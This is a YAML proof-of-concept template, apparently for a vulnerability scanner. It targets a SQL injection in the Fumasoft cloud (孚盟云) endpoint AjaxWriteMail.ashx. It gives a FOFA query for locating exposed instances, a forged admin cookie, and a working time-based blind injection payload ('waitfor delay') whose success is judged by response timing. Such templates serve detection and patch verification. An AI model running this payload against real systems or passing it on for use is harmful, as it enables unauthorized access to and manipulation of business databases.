id: poc-yaml-fumasoft-ajaxwritemail-ashx-sqli
info:
  name: 孚盟云 AjaxWriteMail.ashx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 孚盟云
  fofa: app="孚盟软件-孚盟云"
variables:
  t1: random_int(1,5)
  t2: t1 + t1
  t3: t2 + 2
requests:
- method: POST
  path: /m/Dingding/Ajax/AjaxWriteMail.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: UserCookie={"empId":"admin","corpId":"1"}
  expression: status_code == 500 && contains(body,"未将对象引用设置到对象的实例")
- method: POST
  path: /m/Dingding/Ajax/AjaxWriteMail.ashx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: UserCookie={"empId":"admin","corpId":"1"}
  data: method=updateLastedContactTable&mails=1'waitfor+delay'0:0:{{.t1}}'--+
  expression: status_code == 200 && body == "" && duration > t2 && duration < t3
transport: http
